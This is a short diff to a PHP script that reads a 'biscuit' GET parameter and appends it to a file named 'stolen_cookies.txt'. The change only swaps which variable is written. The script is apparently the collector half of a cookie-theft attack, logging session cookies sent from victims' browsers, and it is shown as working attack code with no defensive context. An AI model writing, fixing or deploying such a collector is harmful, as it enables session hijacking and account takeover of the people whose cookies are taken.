@@ -7,7 +7,7 @@ if (isset($_GET['biscuit'])) {
 
 	// Save the value to a file
 	$fp = fopen("stolen_cookies.txt", "a");
-	fwrite($fp, $cookie . "\t");
+	fwrite($fp, $value . "\t");
 	fclose($fp);
 }
 
